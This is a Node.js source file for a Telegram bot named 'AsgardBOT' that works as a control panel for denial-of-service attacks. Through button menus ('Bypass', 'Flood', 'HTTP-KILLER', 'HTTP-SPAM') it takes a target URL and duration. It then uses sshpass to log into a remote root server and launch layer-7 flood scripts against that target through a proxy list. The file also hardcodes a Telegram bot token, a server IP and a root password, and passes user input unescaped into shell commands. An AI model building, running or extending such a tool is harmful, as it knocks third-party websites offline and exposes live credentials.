const TelegramBot = require('node-telegram-bot-api');
const { spawn } = require('child_process');

const token = '6267696621:AAG5x2Dedg_JCg_kBeBZ8Dv88uU6OuJphDQ';
const bot = new TelegramBot(token, { polling: true });

const sshHost = '45.41.241.74';
const sshPort = 22;
const sshUsername = 'root';
const sshPassword = '3NtudyvE1QQAlZCfmuyPNjWdaBzdd3n8eZO0sFkSIuNuRTSwlL';

let sshConnection;

// Initial keyboard with three buttons
const initialKeyboard = {
  reply_markup: {
    keyboard: [['Bypass', 'Flood', 'STOP']],
    resize_keyboard: true,
    one_time_keyboard: true,
  },
};

// Additional keyboards
const browserKeyboard = {
  reply_markup: {
    keyboard: [['Browser', 'TLS']],
    resize_keyboard: true,
    one_time_keyboard: true,
  },
};

const floodKeyboard = {
  reply_markup: {
    keyboard: [['HTTP-KILLER', 'HTTP-SPAM']],
    resize_keyboard: true,
    one_time_keyboard: true,
  },
};

// Execute SSH command
const executeSshCommand = (command, chatId, successMessage) => {
  sshConnection = spawn('sshpass', ['-p', sshPassword, 'ssh', '-o', 'StrictHostKeyChecking=no', '-p', sshPort, `${sshUsername}@${sshHost}`, command]);

  sshConnection.stdout.on('data', (data) => {
    const output = data.toString();
    bot.sendMessage(chatId, output);
  });

  sshConnection.stderr.on('data', (data) => {
    const error = data.toString();
    bot.sendMessage(chatId, `Error: ${error}`);
  });

  sshConnection.on('close', (code) => {
    bot.sendMessage(chatId, `SSH command execution finished with code ${code}`);
    sshConnection = null;
  });

  bot.sendMessage(chatId, successMessage);
};

// Bypass button handler
bot.onText(/Bypass/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Choose an option:', browserKeyboard);
});

// Bypass button handler
bot.onText(/TLS/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Enter the URL:');
  bot.once('message', (msg) => {
    const url = msg.text;
    bot.sendMessage(chatId, 'Enter the time:');
    bot.once('message', (msg) => {
      const time = msg.text;
      const command = `cd DDoS && cd L7 && node TLS.js ${url} ${time} 5 proxi.txt 512`;
      executeSshCommand(command, chatId, 'TLS attack started.');
    });
  });
});

// Bypass button handler
bot.onText(/Browser/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Enter the URL:');
  bot.once('message', (msg) => {
    const url = msg.text;
    bot.sendMessage(chatId, 'Enter the time:');
    bot.once('message', (msg) => {
      const time = msg.text;
      const command = `cd DDoS && cd L7 && python3 browser.py ${url} 3000 ${time}`;
      executeSshCommand(command, chatId, 'Browser attack started.');
    });
  });
});


// Flood button handler
bot.onText(/Flood/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Choose an option:', floodKeyboard);
});

// HTTP-KILLER button handler
bot.onText(/HTTP-KILLER/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Enter the URL:');
  bot.once('message', (msg) => {
    const url = msg.text;
    bot.sendMessage(chatId, 'Enter the time:');
    bot.once('message', (msg) => {
      const time = msg.text;
      const command = `cd DDoS && cd L7 && node FLOOD.js POST ${url} proxi.txt ${time} 512 15`;
      executeSshCommand(command, chatId, 'HTTP-KILLER attack started.');
    });
  });
});

// HTTP-SPAM button handler
bot.onText(/HTTP-SPAM/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Enter the URL:');
  bot.once('message', (msg) => {
    const url = msg.text;
    bot.sendMessage(chatId, 'Enter the time:');
    bot.once('message', (msg) => {
      const time = msg.text;
      const command = `cd DDoS && cd L7 && node TLSv1.js POST 15 ${url} ${time} 512`;
      executeSshCommand(command, chatId, 'HTTP-SPAM attack started.');
    });
  });
});

// STOP button handler
bot.onText(/STOP/, (msg) => {
  if (sshConnection) {
    sshConnection.kill();
    bot.sendMessage(msg.chat.id, 'SSH command execution stopped.');
  } else {
    bot.sendMessage(msg.chat.id, 'No scripts running.');
  }
});

// Start command handler
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 'Welcome to the AsgardBOT network', initialKeyboard);
});

console.log('AsgardBOT started.');
